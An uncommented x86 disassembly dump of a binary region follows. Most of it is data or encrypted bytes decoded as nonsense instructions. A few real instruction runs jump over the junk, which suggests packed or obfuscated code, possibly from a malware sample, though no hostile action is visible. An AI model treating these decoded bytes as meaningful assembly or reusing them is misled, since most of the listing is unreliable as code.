  40f967:	inc    eax
  40f968:	pop    DWORD PTR [edi+0x11]
  40f96b:	sbb    dl,BYTE PTR [ebx+0x12f5e94a]
  40f971:	sub    eax,0x89a643fa
  40f976:	jmp    0x1f982dff
  40f97b:	arpl   sp,cx
  40f97d:	cwde   
  40f97e:	loop   0x40f960
  40f980:	adc    cl,dl
  40f982:	cli    
  40f983:	adc    eax,0xd52670e8
  40f988:	enter  0x3c63,0xfd
  40f98c:	push   es
  40f98d:	(bad)  
  40f98e:	mov    edx,0x8900d8a1
  40f993:	mul    DWORD PTR [edx-0x78]
  40f996:	ret    
  40f997:	mov    ch,0xdd
  40f999:	fwait
  40f99a:	jmp    0x40f9d0
  40f99c:	and    eax,0x20252f64
  40f9a1:	xchg   edi,eax
  40f9a2:	pushf  
  40f9a3:	out    0x96,al
  40f9a5:	(bad)  
  40f9a7:	mov    eax,0xf6278bb4
  40f9ac:	je     0x40f9db
  40f9ae:	and    esp,DWORD PTR [edx+0xf6a2f21]
  40f9b4:	inc    eax
  40f9b5:	xor    al,0x7b
  40f9b7:	rcl    ah,cl
  40f9b9:	and    edx,DWORD PTR [esi]
  40f9bb:	mov    BYTE PTR [edx],ah
  40f9bd:	imul   eax,ebp,0xffffffe8
  40f9c0:	dec    esi
  40f9c1:	inc    esi
  40f9c2:	mov    al,0xaa
  40f9c4:	sub    ebx,DWORD PTR [edi-0x66]
  40f9c7:	rcl    ecx,0x3d
  40f9ca:	in     al,0x32
  40f9cc:	mov    ss,ebx
  40f9ce:	pop    ss
  40f9cf:	pop    eax
  40f9d0:	sbb    dh,BYTE PTR [bx-0x5d]
  40f9d4:	push   esi
  40f9d5:	adc    esi,DWORD PTR ds:0x4337f7
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x4337fb
  40f9e5:	adc    DWORD PTR ds:0x4338b3,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	aad    0x87
  40fa12:	mov    al,0x59
  40fa14:	or     esi,DWORD PTR [ebp+0x7cac7e7e]
  40fa1a:	jle    0x40fa9a
  40fa1c:	adc    dh,dl
  40fa1e:	xchg   ecx,eax
  40fa1f:	call   0x3539:0xbb8138b
  40fa26:	fdivr  DWORD PTR [esi+edi*1]
  40fa29:	push   esi
  40fa2a:	fcomp  st(0)
  40fa2c:	fs cmp eax,0x3dc63f9a
  40fa32:	sbb    DWORD PTR [ecx+0x22],edx
  40fa35:	pop    ds
  40fa36:	jno    0x40faa1
  40fa38:	rol    DWORD PTR [ecx+esi*1+0x7d],cl
  40fa3c:	les    edx,FWORD PTR ds:0x609c937f
  40fa42:	xchg   edi,eax
  40fa44:	jbe    0x40fa33
  40fa46:	push   ecx
  40fa47:	mov    dl,0x55
  40fa49:	mov    ebx,0x66734b6f
  40fa4e:	int3   
  40fa4f:	fistp  QWORD PTR [ebp-0x31]
  40fa52:	or     al,0x85
  40fa54:	or     eax,0xb861b144
  40fa59:	adc    DWORD PTR [eax+0x60167fbb],edx
  40fa5f:	sbb    al,0x49
  40fa61:	retf   0xb229
  40fa64:	mov    WORD PTR cs:[esi],fs
  40fa67:	pusha  
  40fa68:	cmp    BYTE PTR [ecx-0x4f2c7890],0x67
  40fa6f:	cmp    bl,ah
  40fa71:	out    dx,eax
  40fa72:	frstor ds:0xb550188b
  40fa78:	dec    edi
  40fa79:	popa   
  40fa7a:	jp     0x40faee
  40fa7c:	cmp    esi,DWORD PTR [edx-0x6c]
  40fa7f:	popf   
  40fa80:	test   al,0x48
  40fa82:	test   al,0xc9
  40fa84:	sbb    al,0xed
  40fa86:	xor    DWORD PTR [esi-0x39],ebx
  40fa89:	jne    0x40fab0
  40fa8b:	or     BYTE PTR [ecx+0x3c],ch
  40fa8e:	xchg   ebp,eax
  40fa8f:	rcl    BYTE PTR [ebx-0x1c],cl
  40fa92:	enter  0xc2f,0x3c
  40fa96:	fild   WORD PTR [ecx]
  40fa98:	enter  0x68e6,0xd
  40fa9c:	mov    al,ds:0x30b2ae2a
  40faa1:	and    al,0x14
  40faa3:	or     eax,0x53927624
  40faa8:	pop    ss
  40faa9:	add    DWORD PTR [ebx+0x79],eax
  40faac:	cmp    eax,0x5f85c955
  40fab1:	aas    
  40fab2:	ds in  al,0xd4
  40fab5:	push   cs
  40fab6:	rcr    dl,cl
  40fab8:	pusha  
  40fab9:	cmp    BYTE PTR [eax],bl
  40fabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fabc:	pop    eax
  40fabd:	sbb    DWORD PTR [edx+eiz*8+0x51fdfff9],ebx
  40fac4:	mov    ebx,0xddabf18e
  40fac9:	int    0x2a
  40facb:	xchg   ebx,eax
  40facc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40facd:	out    dx,eax
  40face:	das    
  40facf:	cmp    esi,DWORD PTR [ebp-0x779cd0d6]
  40fad5:	enter  0xc973,0x2a
  40fad9:	lock jb 0x40fa75
  40fadc:	enter  0xf2fd,0x8d
  40fae0:	into   
  40fae1:	or     al,0xab
  40fae3:	and    ecx,edx
  40fae5:	inc    eax
  40fae6:	xchg   esi,eax
  40fae7:	jmp    0x12ed:0xd7404796
  40faee:	sub    eax,0xf798f391
  40faf3:	cmp    al,dl
  40faf5:	mov    BYTE PTR [edi-0x4e33262f],bh
  40fafb:	popa   
  40fafc:	ror    DWORD PTR [esi-0x5a1897d9],1
  40fb02:	mov    edi,0xa1a9dc7f
  40fb07:	(bad)  
  40fb09:	mov    ds:0x27b7d15e,eax
  40fb0e:	jg     0x40faa7
  40fb10:	jg     0x40fac0
  40fb12:	mov    ds:0x36fc062e,eax
  40fb17:	das    
  40fb18:	jae    0x40fb29
  40fb1a:	pinsrw mm7,WORD PTR [eax-0x2b],0x67
  40fb1f:	dec    edx
  40fb20:	pop    DWORD PTR [edx+0x704ea4f1]
  40fb26:	dec    esi
  40fb27:	loopne 0x40fb16
  40fb29:	neg    DWORD PTR [edi+0x9]
  40fb2c:	cs inc ebx
  40fb2e:	daa    
  40fb2f:	out    0xe3,eax
  40fb31:	and    DWORD PTR [esi],ebx
  40fb33:	and    ch,dl
  40fb35:	cmp    al,0x18
  40fb37:	sar    BYTE PTR [edi+0x65],1
  40fb3a:	dec    esi
  40fb3b:	sar    DWORD PTR [ecx-0x5c23fcde],cl
  40fb41:	jle    0x40faef
  40fb43:	data16 fsincos 
  40fb46:	aas    
  40fb47:	mov    dl,0x8d
  40fb49:	mov    edx,0x360a967
  40fb4e:	scas   al,BYTE PTR es:[edi]
  40fb4f:	call   0x7669:0x22290ca
  40fb56:	jg     0x40fbb0
  40fb58:	mov    dh,0x8c
  40fb5a:	xor    eax,0xd4e13ab1
  40fb5f:	fmul   QWORD PTR [ebp-0x59]
  40fb62:	or     esi,esp
  40fb64:	and    eax,0x9c9359d3
  40fb69:	push   es
  40fb6a:	jnp    0x40fb7d
  40fb6c:	mov    WORD PTR [ebp+0x700cd1df],gs
  40fb72:	ja     0x40fb16
  40fb74:	jmp    0x9a1e:0x49b6ef58
  40fb7b:	add    ch,BYTE PTR [edi]
  40fb7d:	mov    edi,0x49a79df8
  40fb82:	sbb    DWORD PTR [eax],ebp
  40fb84:	or     DWORD PTR [ebx],esp
  40fb86:	sbb    DWORD PTR [ecx+0x7204658],esp
  40fb8c:	jge    0x40fb1c
  40fb8e:	js     0x40fb44
  40fb90:	sbb    eax,0xaa8ee2c3
  40fb95:	fs pop ecx
  40fb97:	or     eax,0xae9cb85e
  40fb9c:	aaa    
  40fb9d:	out    dx,al
  40fb9e:	dec    ecx
  40fb9f:	shl    dl,1
  40fba1:	fstp   TBYTE PTR [esp+edx*2]
  40fba4:	push   ss
  40fba5:	or     al,0xe0
  40fba7:	inc    eax
  40fba8:	das    
  40fba9:	pop    ecx
  40fbaa:	sbb    eax,0x8b6217e3
  40fbaf:	loopne 0x40fc2e
  40fbb1:	sub    esp,DWORD PTR [edx+0x13]
  40fbb4:	add    al,0xdc
  40fbb6:	sbb    BYTE PTR [ebx],dl
  40fbb8:	pop    edx
  40fbb9:	xor    DWORD PTR [edx+ecx*1],esp
  40fbbc:	ins    BYTE PTR es:[edi],dx
  40fbbd:	cmp    dh,BYTE PTR [edx-0x33]
  40fbc0:	inc    esi
  40fbc1:	test   eax,0x298fa4ea
  40fbc6:	(bad)  
  40fbc7:	aad    0xb2
  40fbc9:	pushf  
  40fbca:	cmp    bh,BYTE PTR [esi]
  40fbcc:	lods   eax,DWORD PTR ds:[esi]
  40fbcd:	stos   BYTE PTR es:[edi],al
  40fbce:	adc    BYTE PTR [esi],0x3
  40fbd1:	bound  edx,QWORD PTR [ecx]
  40fbd3:	lods   al,BYTE PTR ds:[esi]
  40fbd4:	adc    ch,bh
  40fbd6:	imul   ebp,DWORD PTR [ebx+eax*4],0xffffffed
  40fbda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbdb:	in     al,0xdd
  40fbdd:	jne    0x40fb7a
  40fbdf:	lea    ebp,[esi]
  40fbe1:	popf   
  40fbe2:	sahf   
  40fbe3:	pop    ds
  40fbe4:	jb     0xfddd2797
  40fbea:	gs inc esi
  40fbec:	cdq    
  40fbed:	push   es
  40fbee:	fs cmc 
  40fbf0:	xchg   edi,eax
  40fbf1:	sahf   
  40fbf2:	dec    ebp
  40fbf3:	cmp    bh,BYTE PTR [edx+edi*1]
  40fbf6:	dec    ebx
  40fbf7:	imul   eax,DWORD PTR [edx+0x3a160045],0x53c9a194
  40fc01:	lock cdq 
  40fc03:	jp     0x40fc44
  40fc05:	pop    ecx
  40fc06:	pop    ebp
  40fc07:	xchg   ecx,eax
  40fc08:	mov    ecx,0x1743f472
  40fc0d:	ret    
  40fc0e:	push   edx
  40fc0f:	inc    ecx
  40fc10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc11:	sbb    BYTE PTR [edx-0x4bd22f01],0xd3
  40fc18:	push   0xffffff9c
  40fc1a:	xor    eax,0xd97e666d
  40fc1f:	push   cs
  40fc20:	int    0xbb
  40fc22:	add    esp,esi
  40fc24:	lods   eax,DWORD PTR ds:[esi]
  40fc25:	sub    eax,0x6bed7621
  40fc2a:	or     eax,0xd7fcbc21
  40fc2f:	sub    BYTE PTR [ecx],bl
  40fc31:	jnp    0x40fbea
  40fc33:	xchg   ebp,eax
  40fc34:	out    dx,eax
  40fc35:	jno    0x40fca6
  40fc37:	inc    esi
  40fc38:	(bad)  
  40fc39:	aaa    
  40fc3a:	dec    esp
  40fc3b:	hlt    
  40fc3c:	stc    
  40fc3d:	jge    0x40fcbc
  40fc3f:	dec    ecx
  40fc40:	out    dx,eax
  40fc41:	(bad)  
  40fc42:	inc    esi
  40fc43:	outs   dx,DWORD PTR ds:[esi]
  40fc44:	sbb    edx,DWORD PTR [edi+0x4e]
  40fc47:	das    
  40fc48:	mov    eax,0x7612a020
  40fc4d:	push   esp
  40fc4e:	xor    edi,ebx
  40fc50:	cmp    eax,0xcadeeec4
  40fc55:	cmp    BYTE PTR [ecx],dh
  40fc57:	xor    DWORD PTR [edi+0x4510ef7e],ebp
  40fc5d:	push   es
  40fc5e:	push   ecx
  40fc5f:	xchg   edx,eax
  40fc60:	cli    
  40fc61:	pop    esp
  40fc62:	imul   ecx,ecx,0x5de56e7a
  40fc68:	or     eax,0xbaacbc8d
  40fc6d:	mov    ecx,0x88c344d
  40fc72:	fstp   TBYTE PTR [edi-0x19d5cfe8]
  40fc78:	push   ss
  40fc79:	repz dec ebx
  40fc7b:	xchg   ebx,eax
  40fc7c:	add    eax,0xa5eccbc6
  40fc81:	fisttp DWORD PTR [eax]
  40fc83:	mov    ch,0x7f
  40fc85:	sub    dh,dh
  40fc87:	and    BYTE PTR [esi-0x58],0xc0
  40fc8b:	loopne 0x40fca4
  40fc8d:	or     ebp,ecx
  40fc8f:	sub    BYTE PTR [esi-0x7cd4b5b6],cl
  40fc95:	(bad)  
  40fc96:	xor    al,0x90
  40fc98:	and    eax,0x875ab24c
  40fc9d:	mov    edx,0x139c0540
  40fca2:	push   esi
  40fca3:	(bad)  
  40fca4:	push   ds
  40fca5:	ja     0x40fcf6
  40fca7:	adc    al,0x8
  40fca9:	xchg   ebp,eax
  40fcaa:	adc    DWORD PTR [ecx],eax
  40fcac:	int    0x19
  40fcae:	dec    esp
  40fcaf:	add    ebx,DWORD PTR [ecx-0x1e]
  40fcb2:	xchg   esp,eax
  40fcb3:	cmp    al,0x6f
  40fcb5:	mov    ebx,0x2f008b32
  40fcba:	dec    eax
  40fcbb:	std    
  40fcbc:	xchg   esi,eax
  40fcbd:	retf   0x819f
  40fcc0:	push   0xc8e13cf5
  40fcc5:	pop    es
  40fcc6:	aas    
  40fcc7:	int3   
  40fcc8:	data16 sbb BYTE PTR [esi+esi*4],dl
  40fccc:	push   edx
  40fccd:	popf   
  40fcce:	add    esi,ecx
  40fcd0:	add    eax,ecx
  40fcd2:	jmp    0x40ffa1
  40fcd7:	lock sub DWORD PTR [ebx-0x20],esp
  40fcdb:	arpl   WORD PTR [eax+0x71],si
  40fcde:	sub    ebp,esi
  40fce0:	scas   eax,DWORD PTR es:[edi]
  40fce1:	ret    
  40fce2:	shl    eax,0x4
  40fce5:	iret   
  40fce6:	xchg   edx,eax
  40fce7:	mov    ecx,0xac7e7eb3
  40fcec:	jl     0x40fd6c
  40fcee:	jle    0x40fd4d
  40fcf0:	out    dx,eax
  40fcf1:	bound  eax,QWORD PTR [edx+0x40]
  40fcf4:	mov    ebp,0x6a961199
  40fcf9:	jo     0x40fd3f
  40fcfb:	outs   dx,BYTE PTR ds:[esi]
  40fcfc:	or     eax,0xe583ae8a
  40fd01:	test   al,0xf7
  40fd03:	add    dl,dh
  40fd05:	rol    DWORD PTR [ecx-0x6cc2fc88],0x3d
  40fd0c:	inc    esi
  40fd0d:	xlat   BYTE PTR ds:[ebx]
  40fd0e:	rcl    dh,cl
  40fd10:	or     BYTE PTR [ebx+0x61745886],dh
  40fd16:	arpl   WORD PTR [ebp-0x76],di
  40fd19:	dec    edx
  40fd1a:	inc    esi
  40fd1b:	shl    ecx,1
  40fd1d:	in     al,dx
  40fd1e:	cmp    DWORD PTR [edx-0x37107bb6],ecx
  40fd24:	fs and bl,dl
  40fd27:	sub    bl,dh
  40fd29:	mov    esi,0xc919242e
  40fd2e:	stc    
  40fd2f:	or     eax,0x8afb9284
  40fd34:	pop    edi
  40fd35:	(bad)  
  40fd37:	cmp    esi,0xe704c199
  40fd3d:	dec    esi
  40fd3e:	test   al,0xac
  40fd40:	jnp    0x40fd44
  40fd42:	repz je 0x40fd4d
  40fd45:	xchg   edi,eax
  40fd46:	jle    0x40fd37
  40fd48:	cmp    eax,DWORD PTR [ebx-0x19]
  40fd4b:	mov    al,0xcc
  40fd4d:	addr16 push edx
  40fd4f:	sbb    edx,DWORD PTR ds:[ebp-0x462abcef]
  40fd56:	sbb    al,0x44
  40fd58:	pop    edx
  40fd59:	scas   al,BYTE PTR es:[edi]
  40fd5a:	dec    esp
  40fd5b:	xor    al,0x1d
  40fd5d:	and    ah,ch
  40fd5f:	cmp    DWORD PTR [ecx+ebp*2],ebx
  40fd62:	repnz add eax,0x2b3b687d
  40fd68:	push   esp
  40fd69:	out    dx,al
  40fd6a:	sbb    ebx,DWORD PTR ds:0x8be61c3a
  40fd70:	icebp  
  40fd71:	mov    ebx,0xee7e00d9
  40fd76:	and    al,0x8
  40fd78:	xlat   BYTE PTR ds:[ebx]
  40fd79:	push   esp
  40fd7a:	arpl   WORD PTR ds:0x89e94527,dx
  40fd80:	call   0x3e5abb0f
  40fd85:	mov    eax,ds:0xcb9c76f5
  40fd8a:	xchg   edx,eax
  40fd8b:	cli    
  40fd8c:	mov    bh,0x66
  40fd8e:	xchg   esi,eax
  40fd8f:	icebp  
  40fd90:	mov    ch,0x12
  40fd92:	xor    BYTE PTR [edi+0x876b5a],0x90
  40fd99:	(bad)  
  40fd9a:	aam    0xbe
  40fd9c:	add    bh,al
  40fd9e:	push   ss
  40fd9f:	mov    edi,0xf54a0546
  40fda4:	cmc    
  40fda5:	mov    bh,0x9
  40fda7:	shl    BYTE PTR [ebp-0x5786bfa2],0xc3
  40fdae:	cmp    BYTE PTR [edx],dl
  40fdb0:	mov    ebp,0x66ba4152
  40fdb5:	das    
  40fdb6:	stc    
  40fdb7:	mov    al,ch
  40fdb9:	push   esi
  40fdba:	adc    al,0xee
  40fdbc:	in     al,0x66
  40fdbe:	loope  0x40fddf
  40fdc0:	cmp    ax,0x5662
  40fdc5:	loope  0x40fd94
  40fdc7:	stos   DWORD PTR es:[edi],eax
  40fdc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdc9:	xchg   ecx,eax
  40fdca:	loopne 0x40fdaa
  40fdcc:	mov    cl,BYTE PTR [esi]
  40fdce:	jle    0x40fd81
  40fdd0:	pusha  
  40fdd1:	lods   eax,DWORD PTR ds:[esi]
  40fdd2:	into   
  40fdd3:	cs xchg ecx,eax
  40fdd5:	clc    
  40fdd6:	mov    WORD PTR [ecx+0x9],cs
  40fdd9:	sbb    esp,DWORD PTR [ebp+0x3100dfc5]
  40fddf:	std    
  40fde0:	pop    ebp
  40fde1:	cmp    bh,BYTE PTR [ecx+esi*1-0x3f68edac]
  40fde8:	xchg   ebp,eax
  40fde9:	or     dh,ch
  40fdeb:	and    eax,0xdf9fc898
  40fdf0:	clc    
  40fdf1:	mov    ?,WORD PTR [eax-0x441fd377]
  40fdf7:	jns    0x40fd7e
  40fdf9:	adc    eax,0x7dadc000
  40fdfe:	xor    bl,bh
  40fe00:	lea    eax,[ebp+eiz*8+0x8]
  40fe04:	pop    edi
  40fe05:	fcomp  QWORD PTR [ecx]
  40fe07:	out    0x2f,al
  40fe09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe0a:	adc    eax,0x465dc06b
  40fe0f:	xor    bh,BYTE PTR [eax-0x1f47cf1]
  40fe15:	dec    edx
  40fe16:	xor    ch,0xd5
  40fe19:	arpl   WORD PTR [edi+edi*8+0x3e],bp
  40fe1d:	mov    ebx,0x4fdd6786
  40fe22:	pop    ebx
  40fe23:	adc    edx,DWORD PTR [eax-0x2b132e0b]
  40fe29:	cmp    eax,0x3456cbf3
  40fe2e:	mov    edi,0x6b3df9ba
  40fe33:	loopne 0x40fe9b
  40fe35:	jmp    0x98484009
  40fe3a:	xlat   BYTE PTR ds:[ebx]
  40fe3b:	add    al,dl
  40fe3d:	in     eax,dx
  40fe3e:	mov    al,0xf4
  40fe40:	push   cs
  40fe41:	mov    edi,DWORD PTR [edx]
  40fe43:	mov    dl,0x30
  40fe45:	in     eax,0xed
  40fe47:	xor    al,ah
  40fe49:	dec    ecx
  40fe4a:	test   al,0xb8
  40fe4c:	(bad)  
  40fe4d:	xchg   ebx,eax
  40fe4e:	cmp    dh,ah
  40fe50:	repz pop ss
  40fe52:	loope  0x40fe81
  40fe54:	inc    esi
  40fe55:	sbb    al,0x7c
  40fe57:	add    al,0xd4
  40fe59:	adc    dh,BYTE PTR [esi-0x20]
  40fe5c:	mov    ebx,0xd36d1f88
  40fe61:	scas   al,BYTE PTR es:[edi]
  40fe62:	outs   dx,BYTE PTR ds:[esi]
  40fe63:	xchg   edx,eax
  40fe64:	cwde   
  40fe65:	push   eax
  40fe66:	push   ss
  40fe67:	ficom  WORD PTR [esi]
  40fe69:	out    0x84,al
  40fe6b:	inc    esi
  40fe6c:	jmp    DWORD PTR [ecx-0x35]
  40fe6f:	dec    eax
  40fe70:	pop    ss
  40fe71:	test   dh,ah
  40fe73:	dec    ecx
  40fe74:	jmp    0x16cd0d3c
  40fe79:	push   edi
  40fe7a:	sub    eax,0x1c012d84
  40fe7f:	(bad)  
  40fe81:	sub    cl,ah
  40fe83:	cmp    eax,0x51947767
  40fe88:	sub    eax,DWORD PTR ds:0xd7d92dd5
  40fe8e:	retf   
  40fe8f:	xchg   BYTE PTR [edx+0x7a],cl
  40fe92:	scas   al,BYTE PTR es:[edi]
  40fe93:	xchg   esp,eax
  40fe94:	hlt    
  40fe95:	xor    al,0x28
  40fe97:	inc    edi
  40fe98:	jmp    0x23df81ee
  40fe9d:	jle    0x40fe26
  40fe9f:	mov    eax,ds:0x749639d1
  40fea4:	aad    0x4b
  40fea6:	mov    dh,0x8d
  40fea8:	inc    esp
  40fea9:	sub    DWORD PTR [ebp+0x66],esi
  40feac:	scas   al,BYTE PTR es:[edi]
  40fead:	inc    eax
  40feae:	lahf   
  40feaf:	dec    eax
  40feb0:	std    
  40feb1:	dec    edx
  40feb2:	pushf  
  40feb3:	sti    
  40feb4:	jno    0x40fe80
  40feb6:	sub    eax,0x761ee25a
  40febb:	mov    BYTE PTR [ecx-0x5b],dl
  40febe:	mov    BYTE PTR [edx],bh
  40fec0:	cwde   
  40fec1:	je     0x40ff33
  40fec3:	mov    esp,0xdf8b7c21
  40fec8:	(bad)  
  40fec9:	fidivr DWORD PTR [esi+0x4cf98b13]
  40fecf:	and    BYTE PTR [esi+0x43],0x8e
  40fed3:	push   edx
  40fed4:	jmp    0x40fee5
  40fed6:	mov    al,ds:0x306cb000
  40fedb:	adc    ebp,ecx
  40fedd:	lahf   
  40fede:	fptan  
  40fee0:	dec    esp
  40fee1:	das    
  40fee2:	jae    0x40ff50
  40fee4:	sub    al,0xe4
  40fee6:	stos   BYTE PTR es:[edi],al
  40fee7:	cmp    DWORD PTR ds:0xa2ebf8fe,esi
  40feed:	push   0x6f6d0425
  40fef2:	cmp    dh,BYTE PTR [ecx]
  40fef4:	cmp    BYTE PTR [eax],al
  40fef6:	in     eax,0xe7
  40fef8:	stc    
  40fef9:	mov    ds:0xe8120f06,al
  40fefe:	dec    ebx
  40feff:	and    DWORD PTR [edi+0x7cbeb454],eax
  40ff05:	or     eax,0x4f173abe
  40ff0a:	nop
  40ff0b:	jo     0x40ff02
  40ff0d:	jae    0x40ff18
  40ff0f:	mov    bh,0x5b
  40ff11:	(bad)  
  40ff12:	sbb    BYTE PTR [esi-0x32],ah
  40ff15:	dec    esi
  40ff16:	call   0xef7f:0x933c2cb5
  40ff1d:	push   ds
  40ff1e:	ins    BYTE PTR es:[edi],dx
  40ff1f:	push   esi
  40ff20:	mov    edx,DWORD PTR [eax]
  40ff22:	jecxz  0x40ff4b
  40ff24:	inc    eax
  40ff25:	outs   dx,DWORD PTR ds:[esi]
  40ff26:	mov    al,0xa7
  40ff28:	push   cs
  40ff29:	pop    ds
  40ff2a:	fucomip st,st(3)
  40ff2c:	or     DWORD PTR [edi-0x39],ecx
  40ff2f:	and    DWORD PTR [ecx+eax*4],edi
  40ff32:	btc    DWORD PTR [esi-0x56841ce1],eax
  40ff39:	int3   
  40ff3a:	cld    
  40ff3b:	test   edx,ebp
  40ff3d:	imul   edi,ecx,0x4f9c68ff
  40ff43:	mov    DWORD PTR [edi],esi
  40ff45:	imul   edx,DWORD PTR [eax+0x32],0x7b
  40ff49:	pushf  
  40ff4a:	sub    esi,DWORD PTR [ebx]
  40ff4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff4d:	jo     0x40ff24
  40ff4f:	mov    esi,DWORD PTR [esi-0x19b8c1a4]
  40ff55:	cld    
  40ff56:	push   esp
  40ff57:	pop    ecx
  40ff58:	shl    DWORD PTR [eax-0x62595761],0x7b
  40ff5f:	jo     0x40ffa0
  40ff61:	ror    DWORD PTR [edx+0x39],0x97
  40ff65:	or     eax,0xed68e4b1
  40ff6a:	(bad)  
  40ff6b:	sbb    DWORD PTR [edx+0x67],edx
  40ff6e:	jecxz  0x40ffb0
  40ff70:	adc    eax,0xc2f7484d
  40ff75:	xor    ecx,0xffffffa6
  40ff78:	xor    ah,dh
  40ff7a:	addr16 pop ebp
  40ff7c:	mov    ebx,0x5445597f
  40ff81:	add    al,0x80
  40ff83:	out    dx,eax
  40ff84:	jb     0x40ffb9
  40ff86:	mov    ecx,0xf4aa2707
  40ff8b:	and    bh,BYTE PTR [ebx+0x3af7b08d]
  40ff91:	xchg   esp,eax
  40ff92:	test   DWORD PTR [ebp+0x278dfbd1],esi
  40ff98:	fld    st(5)
  40ff9a:	sbb    BYTE PTR [ecx],0x97
  40ff9d:	inc    eax
  40ff9e:	ret    0x8450
  40ffa1:	imul   eax,esi
  40ffa4:	mov    esi,DWORD PTR [ebp+0xc]
  40ffa7:	mov    DWORD PTR ds:0x4337a3,0x6048
  40ffb1:	cmp    esi,eax
  40ffb3:	jne    0x4102bc
  40ffb9:	mov    eax,DWORD PTR [ebp-0x4]
  40ffbc:	sbb    DWORD PTR ds:0x433867,0x14e6
  40ffc6:	jmp    0x410295
  40ffcb:	inc    eax
  40ffcc:	sbb    BYTE PTR [esi+0x407076f6],dh
  40ffd2:	test   al,0x4a
  40ffd4:	add    eax,0x263139b1
  40ffd9:	mov    ebp,0x7ebef70a
  40ffde:	jle    0x40ff8c
  40ffe0:	jl     0x410060
  40ffe2:	jle    0x40ff6d
  40ffe4:	jne    0x410009
  40ffe6:	adc    eax,0x3f4c7957
  40ffeb:	jle    0x40ffbc
  40ffed:	ins    DWORD PTR es:[edi],dx
  40ffee:	xchg   ebx,eax
  40ffef:	call   0xdcce5089
  40fff4:	mov    ecx,0x8694dbe9
  40fff9:	push   edi
  40fffa:	adc    DWORD PTR [edi-0x4089f236],0xd89eea8b
  410004:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410005:	mov    eax,0xd82e5b42
  41000a:	shl    DWORD PTR [esi],1
  41000c:	and    eax,0x363613d5
  410011:	mov    edx,0x5c5070f1
  410016:	mov    WORD PTR [esi+0x6e],?
  410019:	xchg   DWORD PTR [ebp+0x4],ebp
  41001c:	xor    DWORD PTR ds:0xc5fa67ff,ecx
  410022:	xchg   edi,eax
  410023:	sub    BYTE PTR [edi+0x24625ba],al
  410029:	push   es
  41002a:	out    dx,al
  41002b:	pop    es
  41002c:	inc    esi
  41002d:	xchg   ebx,eax
  41002e:	jmp    0x41006e
  410030:	mov    edx,0x21161f45
  410035:	push   esp
  410036:	test   DWORD PTR ds:0x9a45a028,0xc950b8bf
  410040:	dec    ebp
  410041:	aas    
  410042:	mov    cl,bh
  410044:	sbb    eax,0x45a8be8b
  410049:	or     cl,BYTE PTR [esi+0x7c]
  41004c:	xor    edx,eax
  41004e:	xor    BYTE PTR [edi-0x1915afed],0xbb
  410055:	jl     0x410019
  410057:	dec    ecx
  410058:	xor    esi,DWORD PTR [edi]
  41005a:	xchg   edx,eax
  41005b:	xchg   esi,eax
  41005c:	lods   eax,DWORD PTR ds:[esi]
  41005d:	pop    esi
  41005e:	enter  0x5968,0xff
  410062:	pop    esi
  410063:	aad    0x5f
  410065:	jp     0x40ffe7
  410067:	mov    WORD PTR [eax],?
  410069:	imul   edi,DWORD PTR [ebx+ecx*1-0x6860ee28],0xf12acdf0
  410074:	mov    ds:0xb68963d9,al
  410079:	imul   edi,DWORD PTR [edi+0x49],0xf1dc617
  410080:	stc    
  410081:	add    eax,0xa1307af9
  410086:	dec    edi
  410087:	xlat   BYTE PTR ds:[ebx]
  410088:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410089:	inc    edi
  41008a:	ds je  0x41002f
  41008d:	lds    ebp,FWORD PTR [ecx+0x7f]
  410090:	xchg   ebx,eax
  410091:	repnz es imul eax,ebp,0x738c525e
  410099:	lods   al,BYTE PTR ds:[esi]
  41009a:	je     0x4100ce
  41009c:	push   edi
  41009d:	mov    ds:0x9168d5d1,eax
  4100a2:	out    0x4c,eax
  4100a4:	les    ebp,FWORD PTR [ebx-0x2b486f6d]
  4100aa:	pop    ss
  4100ab:	push   esp
  4100ac:	mov    eax,ds:0x7099cd74
  4100b1:	out    dx,al
  4100b2:	in     al,dx
  4100b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100b4:	and    BYTE PTR [ebx-0x4a3f0111],dl
  4100ba:	(bad)  
  4100bb:	ficomp WORD PTR [edx-0x34]
  4100be:	mov    dl,0x51
  4100c0:	sbb    bh,dl
  4100c2:	mov    ah,0xd9
  4100c4:	ins    DWORD PTR es:[edi],dx
  4100c5:	test   DWORD PTR [ebx+0x49],edx
  4100c8:	push   ds
  4100c9:	pop    edx
  4100ca:	popa   
  4100cb:	pop    ebx
  4100cc:	idiv   bl
  4100ce:	in     al,dx
  4100cf:	or     BYTE PTR [ecx+eiz*1],bh
  4100d2:	js     0x410118
  4100d4:	or     esi,DWORD PTR [edx-0x7693e1e4]
  4100da:	and    esp,DWORD PTR [esi]
  4100dc:	sar    BYTE PTR [eax-0x33],0x19
  4100e0:	jbe    0x410141
  4100e2:	and    al,0xd7
  4100e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100e5:	jg     0x410124
  4100e7:	or     BYTE PTR [eax-0x6617249e],bh
  4100ed:	je     0x410134
  4100ef:	imul   ebp,ebx,0xac5a2f6a
  4100f5:	add    ecx,DWORD PTR [ebx]
  4100f7:	pop    ecx
  4100f8:	jae    0x410174
  4100fa:	adc    al,0x2
  4100fc:	mov    dl,0xe8
  4100fe:	(bad)  [eax+0x6a]
  410101:	aaa    
  410102:	mov    esi,0x78103ce
  410107:	jno    0x4100b0
  410109:	jle    0x4100fd
  41010b:	mov    ds:0xc8c0ddb4,eax
